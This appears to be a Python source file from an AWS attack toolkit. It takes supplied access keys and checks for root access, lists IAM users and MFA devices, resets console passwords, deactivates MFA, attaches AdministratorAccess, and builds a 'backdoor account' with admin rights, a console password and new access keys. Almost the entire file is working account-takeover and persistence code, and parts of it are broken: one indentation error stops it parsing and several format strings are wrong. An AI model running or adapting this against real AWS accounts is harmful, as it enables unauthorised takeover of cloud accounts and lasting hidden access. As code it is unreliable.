#should be using boto3

import boto3
import botocore

import json
import urllib
import logging
import sys,os
import pprint

pp = pprint.PrettyPrinter(indent=5, width=80)

region = 'us-east-1'

def check_root_account(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY):
    client = boto3.client('iam', aws_access_key_id=AWS_ACCESS_KEY_ID, aws_secret_access_key=AWS_SECRET_ACCESS_KEY,region_name=region)
    
    try:
        acct_summary = client.get_account_summary()
        if acct_summary:
            print("Root Key!!! [or IAM access]")
            print("Printing Account Summary")
            pp.pprint(acct_summary['SummaryMap'])
        client_list = client.list_users()
        if client_list:
            print("Printing Users")
            pp.pprint(client_list['Users'])
        
        print("Checking for console access")
        for user in client_list['Users']:
            
            try:
                profile = client.get_login_profile(UserName=user['UserName'])
                if profile:
                    print('User {} likely has console access and the password can be reset :-)' .format(user['UserName']))
                    print("Checking for MFA on account")
                    mfa = client.list_mfa_devices(UserName=user['UserName'])
                    print mfa['MFADevices']
            
            except botocore.exceptions.ClientError as e:
                if e.response['Error']['Code'] == 'NoSuchEntity':
                    print("[-]: user '{}' likely doesnt have console access" .format(user['UserName']))
                else:
                    print "Unexpected error: {}" .format(e)

    except botocore.exceptions.ClientError as e:
        if e.response['Error']['Code'] == 'InvalidClientTokenId':
            sys.exit("The AWS KEY IS INVALID. Exiting")
        if e.response['Error']['Code'] == 'AccessDenied':
            print('{} : Is NOT a root key' .format(AWS_ACCESS_KEY_ID))
        else:
            print "Unexpected error: {}" .format(e)
    
def change_user_console_password(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, username, password):
    client = boto3.client('iam', aws_access_key_id = AWS_ACCESS_KEY_ID, aws_secret_access_key = AWS_SECRET_ACCESS_KEY, region_name=region)
    
    try:
        response = client.update_login_profile(UserName=username,Password=password, PasswordResetRequired=False)
        print('Changing password for user: {} to password: {}' .format(username, password))
        print('Response to password change was: []' .format(response['ResponseMetadata']['HTTPStatusCode']))
    except botocore.exceptions.ClientError as e:
        if e.response['Error']['Code'] == 'PasswordPolicyViolation':
            print("Password policy violation. Manually check password policy")
        elif e.response['Error']['Code'] == 'NoSuchEntity':
            print("[-]: User likely doesnt have console access")
        else:
            print "Unexpected error: {}" .format(e)


def create_user_console_password(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, username, password):
    client = boto3.client('iam', aws_access_key_id = AWS_ACCESS_KEY_ID, aws_secret_access_key = AWS_SECRET_ACCESS_KEY, region_name=region)
    
    try:
        response = client.create_login_profile(UserName=username,Password=password, PasswordResetRequired=False)
        print('Changing password for user: %s to password: {}' .format(username, password))
        print('Response to password change was: {}' .format(response['ResponseMetadata']['HTTPStatusCode']))
    except botocore.exceptions.ClientError as e:
        if e.response['Error']['Code'] == 'PasswordPolicyViolation':
            print("Password policy violation. Manually check password policy")
        elif e.response['Error']['Code'] == 'NoSuchEntity':
            print("[-]: User likely doesnt have console access")
        else:
            print "Unexpected error: {}" .format(e)


def get_password_policy(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY):
    client = boto3.client('iam', aws_access_key_id = AWS_ACCESS_KEY_ID, aws_secret_access_key = AWS_SECRET_ACCESS_KEY, region_name=region)
    
    try:
        pass_policy = client.get_account_password_policy()
        print("Account Password Policy:")
        pp.pprint(pass_policy['PasswordPolicy'])
    except botocore.exceptions.ClientError as e:
        print "Unexpected error: {}" .format(e)

def create_user(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, username):
    client = boto3.client('iam', aws_access_key_id=AWS_ACCESS_KEY_ID, aws_secret_access_key=AWS_SECRET_ACCESS_KEY, region_name=region)
    
    try:
        print("Creating a new IAM user named: {}" .format(username))
        create_user = client.create_user(Path='/',UserName=username)
        print('Response to create user was: {}' .format(create_user['ResponseMetadata']['HTTPStatusCode']))
        print("New User Details")
        pp.pprint(create_user['User'])
    except botocore.exceptions.ClientError as e:
        if e.response['Error']['Code'] == 'EntityAlreadyExists':
            print("ERROR: The provided user: {} already exists" .format(username))
        else:
            print "Unexpected error: {}" .format(e)

def create_access_key(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, username):
    client = boto3.client('iam', aws_access_key_id=AWS_ACCESS_KEY_ID, aws_secret_access_key=AWS_SECRET_ACCESS_KEY, region_name=region)
    
    try:
        create_access_key = client.create_access_key(UserName=username)
        print("Creating a new access key for: {}" .format(username))
        pp.pprint(create_access_key['AccessKey'])
    except botocore.exceptions.ClientError as e:
        print "Unexpected error: {}" .format(e)

def delete_access_key(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, username, accesskey):
    client = boto3.client('iam', aws_access_key_id=AWS_ACCESS_KEY_ID, aws_secret_access_key=AWS_SECRET_ACCESS_KEY, region_name=region)
    
    try:
        delete_access_key = client.delete_access_key(UserName=username, AccessKeyId=accesskey)
        print("Deleting a access key: {} for: {}" .format(accesskey, username))
        print('Response to delete key was: {}' .format(delete_access_key['ResponseMetadata']['HTTPStatusCode']))
    except botocore.exceptions.ClientError as e:
        if e.response['Error']['Code'] == 'NoSuchEntity':
            print("ERROR: The provided AccessKey doesnt exist")
        else:
            print "Unexpected error: {}" .format(e)

#untested :-/ TODO
def delete_mfa_device(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, username, mfaserial):
    client = boto3.client('iam', aws_access_key_id=AWS_ACCESS_KEY_ID, aws_secret_access_key=AWS_SECRET_ACCESS_KEY, region_name=region)
    try:
        delete_mfa = client.deactivate_mfa_device(UserName=username, SerialNumber=mfaserial)
         print("Deleting a MFA device: {} for: {}" .format(mfaserial, username))
         print('Response to delete MFA devices was: {}' .format(delete_mfa['ResponseMetadata']['HTTPStatusCode']))
    except botocore.exceptions.ClientError as e:
        if e.response['Error']['Code'] == 'NoSuchEntity':
            print("ERROR: The provided AccessKey doesnt exist")
        else:
            print "Unexpected error: {}" .format(e)


def make_admin(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, username):
    client = boto3.client('iam', aws_access_key_id=AWS_ACCESS_KEY_ID, aws_secret_access_key=AWS_SECRET_ACCESS_KEY, region_name=region)
    
    try:
        make_admin = client.attach_user_policy(UserName=username, PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
        print("Adding admin policy to: {}" .format(username))
        print('Response to attaching admin policy was: {}' .format(make_admin['ResponseMetadata']['HTTPStatusCode']))
    #print('Response to delete key was: %s' % delete_access_key['ResponseMetadata']['HTTPStatusCode'])
    except botocore.exceptions.ClientError as e:
        if e.response['Error']['Code'] == 'AccessDenied':
            print("ERROR: Account does not have permissions to add the policy")
        else:
            print "Unexpected error: {}" .format(e)

def make_backdoor_account(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, username, password):
    client = boto3.client('iam', aws_access_key_id=AWS_ACCESS_KEY_ID, aws_secret_access_key=AWS_SECRET_ACCESS_KEY, region_name=region)

    try:
        print("making backdoor account with username: {}" .format(username))
        create_user(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY,username)
        make_admin(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY,username)
        create_user_console_password(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, username, password)
        create_access_key(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY,username)
            
    except botocore.exceptions.ClientError as e:
        print "Unexpected error: {}" .format(e)
